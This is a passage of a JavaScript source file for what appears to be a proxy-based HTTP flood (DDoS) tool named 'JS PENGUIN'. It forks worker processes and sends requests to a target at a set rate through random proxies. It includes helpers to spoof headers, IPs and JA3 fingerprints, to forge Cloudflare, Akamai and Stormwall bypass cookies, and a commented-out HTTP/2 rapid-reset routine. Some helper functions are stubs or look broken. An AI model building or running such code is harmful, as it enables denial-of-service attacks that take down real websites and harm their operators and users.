                const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                const index = proxies.indexOf(proxyKey);
                if (index > -1) proxies.splice(index, 1);
            }
            proxy.close();
            // console.log(`socket error: ${err}`);
            return;
        })
    // }, 1000);
}

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))

    if (ip_opt === undefined) {
        console.log(`
            ${'________'.yellow.bold}${'o8A888888o_'.grey.bold}
           ${'_o8888888888'.yellow}${'88'.grey.bold}${'K_]'.bgBlack.white.bold}${'888888o'.grey.bold}
                      ${'~~~'.yellow}${'+8888888888o'.grey.bold}
                          ${'~8888888888'.grey.bold}
                          ${'o888'}${'88888888'.grey.bold}
                         ${'o88888'}${'88888888'.grey.bold}
                       ${'_888888888'}${'8888888'.grey.bold}
                      ${'o88888888888'}${'8888888_'.grey.bold}
                     ${'o8888888888888'}${'8888888_'.grey.bold}
                    ${'_88888888888888'}${'88888888_'.grey.bold}
                    ${'8888888888888888'}${'88888888_'.grey.bold}
                    ${'8888888888888888'}${'888888888'.grey.bold}
                    ${'8888888888888888'}${'8888888888'.grey.bold}
                    ${'8888888888888888'}${'8888888888'.grey.bold}
                    ${'888888888888888'}${'8'.white.bold}${'88888888888'.grey.bold}
                    ${'~88888888888888'}${'88'.white.bold}${'8888888888_'.grey.bold}
                     ${'(888888888888'}${'8888'.white.bold}${'8888888888'.grey.bold}
                      ${'888888888888'}${'88888'.white.bold}${'8888888888'.grey.bold}
                       ${'8888888888'}${'88888888'.white.bold}${'888888888_'.grey.bold}
                       ${'~88888888'}${'888888888888'.white.bold}${'88888888'.grey.bold}
                         ${'+888888'}${'8888888888888'.white.bold}${'8~~~~~'.grey.bold}
                          ${'~=88'}${'8888888888888888o'.white.bold}
                   ${'_=oooooooo'.yellow.bold}${'8888888888888888'.white.bold}${'88'.white}
                    ${'_o88=8888='.yellow.bold}=~${'88888888'.yellow.bold}===8${'888_'.white}    ${'@benshii'.cyan.underline} # ${colors.dim.bold(new Date().toLocaleDateString("en"))}
                    ${'~'.yellow.bold}   ${'=~~'.yellow.bold} ${'_o88888888='.yellow.bold}      ~~~      ${'JS PENGUIN'.bold} [${'v1.6'.underline}]
                            ${'~ o8=~88=~'.yellow.bold}


        ———   ${'Method'.bold}${':'.red.bold}    [${'HTTP'.bold}${reqmethod.bold}]
        ———   ${'Target'.bold}${':'.red.bold}    [${target.bold.underline}]
        ———   ${'Time'.bold}${':'.red.bold}      [${`${time}`.bold} ${'seconds'.bold}]
        ———   ${'Threads'.bold}${':'.red.bold}   [${`${threads} cores`.bold}]
        ———   ${'Rate'.bold}${':'.red.bold}      [${`${ratelimit} rq/s`.bold}]
        ———   ${'Debug'.bold}${':'.red.bold}     [${debug === "true" ? 'true'.green.bold : debug === "false" ? 'false'.red.bold : Boolean(debug) ? 'true'.green.bold : 'false'.red.bold}]
    `);
    }

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
            cluster.fork({ core: worker.id % os.cpus().length });
        }
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (Boolean(debug) && debug !== "false") {
        var count = 1;
        setInterval(() => {
            let status_codes = {};
            let worker_count = 0;
            for (let w in workers) {
                if (workers[w][0].state === "online") {
                    worker_count++;
                    // console.log(workers[w]);
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!status_codes[code]) status_codes[code] = 0;
                            status_codes[code] += st[code];
                        }
                    }
                } else {
                    // console.log(`worker state: ${workers[w][0].state}`);
                }
            }
            const statusses = Object.entries(status_codes)
                .map(([key, value]) => `${colors.bold(key)}: ${colors.underline(value)}`)
                .join(', ');

            console.log(`[${'JS/VENTOX'.magenta.bold}] | ${colors.bold('Time')}: [${colors.underline(time-count)}], ${colors.bold('Status')}: [${statusses}]`);
            count++;
        }, 1000);
    }
} else {
    // console.log(`starting thread: ${random_string(5)}`);
    let conns = 1;
    let delay = delay_opt ? delay_opt : 1;
    let proxy_protocol = proxytype;
    console.log(`proxy_protocol: ${proxy_protocol}`);
    console.log(`length: ${proxies.length}`);
    console.log(`delay: ${delay}`);

    let max_conns = connections ? undefined : proxies.length / threads;
    let active_conns = 0;

    for (var x = 0; x < conns; x++) {
        const flood_interval = setInterval(() => {
            let proxy_host, proxy_port, proxy_user, proxy_pass;
            const proxy = proxies[~~(Math.random() * proxies.length)].split(':');
            if (connections !== undefined && connections <= active_conns) clearInterval(flood_interval);
            if (proxy && proxy.length >= 2) {
                // console.log(proxy)
                proxy_host = proxy[0]
                proxy_port = parseInt(proxy[1])
                if (proxy.length == 4) {
                    proxy_user = proxy[2]
                    proxy_pass = proxy[3]
                }
                // console.log(proxy_host, proxy_port)
                start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase(), { username: proxy_user, password: proxy_pass })
                active_conns++
            }
        }, delay)
        // for (const proxy of proxies) {
        //     if (!proxy) continue;
        //     if (connections !== undefined && connections <= active_conns) break;
        //     let proxy_host, proxy_port;
        //     proxy_host = proxy.split(':')[0]
        //     proxy_port = parseInt(proxy.split(':')[1])
        //     // console.log(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
        //     start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
        //     active_conns++;
        // }
    }

    if (Boolean(debug) && debug !== "false") {
        setInterval(() => {
            if (status_queue.length >= 4) status_queue.shift();
            status_queue.push(status_codes);
            status_codes = {};
            try {
                if (process.connected) {
                    process.send(status_queue);
                }
            } catch (err) {
                console.log(err);
            }
        }, 250);
    }
}

const exit = () => process.exit(1);
setTimeout(exit, time * 1000);

function bypassHTTPDD0S(proxy, target) {
    console.log("Bypassing HTTPDD0S protection...");
    setInterval(() => {
        const headers = {
            "User-Agent": random_string(15),
            "X-Forwarded-For": random_ip()
        };
        sendRequest(proxy, target, headers);
    }, 1000);
}

function spoofAkamaiFingerprint() {
    return {
        "X-Akamai-Request": "true",
        "X-Request-ID": random_string(32),
        "X-Forwarded-For": random_ip(),
    };
}

function fixJA3Fingerprint() {
    const ja3 = "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0";
    return crypto.createHash('md5').update(ja3).digest('hex');
}

function handleRatelimit(statusCode) {
    if (statusCode === 429) {
        console.log("Rate-limited, retrying...");
        setTimeout(() => {
            sendRequest();
        }, 10000);
    }
}

function generateCookie(mode) {
    let cookie = "";
    switch (mode) {
        case "CLOUDFLARE":
            cookie = "cf_clearance=" + random_string(32);
            break;
        case "STORMWALL":
            cookie = "sw_session=" + random_string(64);
            break;
        case "AKAMAI":
            cookie = "akamai_secure=" + random_string(128);
            break;
        case "REACT":
            cookie = "react_session=" + random_string(64);
            break;
        case "XSRF":
            cookie = "XSRF-TOKEN=" + random_string(16);
            break;
        case "DDG":
            cookie = "ddg_user=" + random_string(32);
            break;
        case "RANDOM":
            cookie = random_string(64);
            break;
        case "custom":
            cookie = "custom=" + random_string(64);
            break;
        default:
            cookie = random_string(64);
            break;
    }
    return cookie;
}

function cacheBypass() {
    return { "cache-control": "no-cache, no-store, must-revalidate" };
}

function updateFingerprint() {
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    };
}

function addUpdatedHeaders() {
    return {
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    };
}

function updateRandPath(path) {
    if (Math.random() > 0.5) {
        return path + "/random/" + random_string(10);
    }
    return path;
}

function detectProxyProtocol(proxy) {
    if (proxy.startsWith("http")) {
        return "http";
    } else if (proxy.startsWith("socks")) {
        return "socks5";
    }
    return "unknown";
}

function debugDataFrame(data) {
    if (debug) {
        console.log("Debug Data: ", data);
    }
}

function rapidReset() {
    console.log("Rapid reset triggered...");
    /*
    if (enabled('reset')) {
                            (async () => {
                                while (true) {
                                    await new Promise(resolve => setTimeout(resolve, random_int(1000, 2000)));
                                    await req.close(http2.constants.NGHTTP2_CANCEL);
                                    await req.end()

                                    await client.destroy();
                                }
                            })();
                        }
                    }

                    let _rate;
                    if (enabled('randrate')) {
                        _rate = random_int(1, 90);
                    } else {
                        _rate = rate;
                    }
                    setTimeout(() => {
                        request();
                    }, 1000 / _rate);
                }
                request();
            }).on('error', (err) => {
                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET" || err.code == "ERR_HTTP2_ERROR") {
                    client.close();
                }
            });
        }).on('error', () => {
            tls_conn.destroy();
        });
        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('close', () => {
        if (tls_conn) { tls_conn.end(() => { tls_conn.destroy(); attack(); }); }
    });
}
    */
}

function updateCiphers() {
    return [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
    ];
}

function adaptiveHTTP2Settings() {
    return {
        maxConcurrentStreams: 100,
        initialWindowSize: 65535,
        headerTableSize: 4096
    };
}

function generateRandomCharacters(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function generateRandomStrings(n) {
    let result = [];
    for (let i = 0; i < n; i++) {
        result.push(generateRandomCharacters(10));
    }
    return result;
}

function generateRandomNumbers(n) {
    let result = [];
    for (let i = 0; i < n; i++) {
        result.push(Math.floor(Math.random() * 10000));
    }
    return result;
}
